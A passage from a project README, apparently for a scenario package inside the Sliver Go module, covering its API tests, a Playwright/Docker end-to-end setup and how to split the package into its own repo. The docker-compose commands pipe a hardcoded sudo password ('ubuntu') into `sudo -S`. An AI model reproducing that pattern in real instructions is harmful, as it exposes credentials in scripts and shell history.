26 tests covering health, CORS, atomics, full chain CRUD, executions, cancel, and SSE.

### UI E2E (Playwright + Docker)

Spins up three containers: testserver → nginx (React build) → Playwright. nginx proxies `/api/v1/` to the testserver, so every UI action hits the real API.

```bash
cd tests
echo ubuntu | sudo -S docker-compose -f docker-compose.e2e.yml build   # first run only
echo ubuntu | sudo -S docker-compose -f docker-compose.e2e.yml up --abort-on-container-exit
echo ubuntu | sudo -S docker-compose -f docker-compose.e2e.yml down
```

9 Playwright tests: dashboard health card, nav links, scenarios list/create/delete, atomics listing, executions list and seeding via API.

See `tests/PLAN.md` and `tests/REPORT.md` for full coverage details and bugs found during development.

---

## Building and moving the package out

The scenario packages live inside the Sliver Go module for convenience (shared vendored deps). To use as a standalone repo, copy this directory (scenario/) as the new repo root:

```bash
cp -r scenario/ /path/to/standalone/
cd /path/to/standalone
# Add go.mod at root, add explicit requires for grpc/gorm/yaml/protobuf, then:
go mod tidy
```
